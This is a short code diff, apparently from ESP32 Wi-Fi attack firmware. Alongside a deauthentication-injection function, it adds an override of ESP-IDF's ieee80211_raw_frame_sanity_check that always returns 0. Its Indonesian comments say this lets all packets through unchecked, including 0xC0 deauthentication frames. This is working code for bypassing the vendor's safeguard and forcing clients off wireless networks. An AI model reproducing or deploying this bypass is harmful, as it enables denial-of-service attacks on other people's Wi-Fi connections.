@@ -28,6 +28,12 @@ esp_err_t rootx_deauth_inject(uint8_t *bssid, uint8_t *target_mac) {
     return esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
 }
 
+// --- THE WSL BYPASSER ---
+// Nge-hijack fungsi validasi frame WiFi bawaan ESP-IDF
+int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+    return 0; // Loloskan semua paket termasuk 0xC0 tanpa dicek!
+}
+
 void app_main(void) {
     // 1. Inisialisasi NVS
     esp_err_t ret = nvs_flash_init();
